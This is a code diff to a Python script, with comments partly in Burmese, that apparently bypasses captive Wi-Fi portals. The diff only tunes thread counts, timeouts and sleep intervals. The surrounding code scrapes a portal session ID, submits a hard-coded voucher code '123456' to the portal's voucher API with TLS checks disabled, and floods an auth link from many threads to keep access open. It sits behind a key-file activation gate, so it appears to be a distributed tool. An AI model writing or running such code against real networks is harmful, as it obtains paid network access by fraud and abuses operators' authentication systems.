@@ -13,7 +13,7 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # --- CONFIGURATION ---
 SECRET_SALT = "ohmygod@123"
-PING_THREADS = 40
+PING_THREADS = 30
 PING_INTERVAL = 0.05
 
 def get_stable_id():
@@ -60,7 +60,7 @@ def verify_activation():
             with open(key_file, "w") as f:
                 f.write(input_key)
             print("Activation Successful! Restarting...")
-            time.sleep(0.5)
+            time.sleep(1)
             return True
         else:
             print("Invalid Key! Access Denied.")
@@ -68,7 +68,7 @@ def verify_activation():
 
 def check_real_internet():
     try:
-        return requests.get("http://www.google.com", timeout=0.8).status_code == 200
+        return requests.get("http://www.google.com", timeout=1).status_code == 200
     except: return False
 
 def high_speed_ping(auth_link, session, sid):
@@ -91,11 +91,11 @@ def start_process():
         test_url = "http://connectivitycheck.gstatic.com/generate_204"
         
         try:
-            r = requests.get(test_url, allow_redirects=True, timeout=0.5)
+            r = requests.get(test_url, allow_redirects=True, timeout=1.5)
             if r.url == test_url:
                 if check_real_internet():
                     print(f"[{time.strftime('%H:%M:%S')}] Internet OK. Waiting...           ", end='\r')
-                    time.sleep(1)
+                    time.sleep(1.5)
                     continue
             
             portal_url = r.url
@@ -103,10 +103,10 @@ def start_process():
             portal_host = f"{parsed_portal.scheme}://{parsed_portal.netloc}"
             
             # Portal Link ရှာဖွေခြင်း
-            r1 = session.get(portal_url, verify=False, timeout=0.5)
+            r1 = session.get(portal_url, verify=False, timeout=1.5)
             path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
             next_url = urljoin(portal_url, path_match.group(1)) if path_match else portal_url
-            r2 = session.get(next_url, verify=False, timeout=0.5)
+            r2 = session.get(next_url, verify=False, timeout=1.5)
             
             sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
             if not sid:
@@ -118,7 +118,7 @@ def start_process():
                 print(f"\n[*] Activating Session with Voucher API...")
                 voucher_api = f"{portal_host}/api/auth/voucher/"
                 try:
-                    session.post(voucher_api, json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1}, timeout=0.5)
+                    session.post(voucher_api, json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1}, timeout=1.5)
                 except: pass
 
                 # Auth Ping
@@ -132,13 +132,14 @@ def start_process():
                     threading.Thread(target=high_speed_ping, args=(auth_link, session, sid), daemon=True).start()
 
                 while check_real_internet():
-                    time.sleep(0.5)
+                    time.sleep(1.5)
 
         except Exception:
-            time.sleep(0.5)
+            time.sleep(1.5)
 
 if __name__ == "__main__":
     try:
         start_process()
     except KeyboardInterrupt:
         print("\nScript Stopped.")
+        
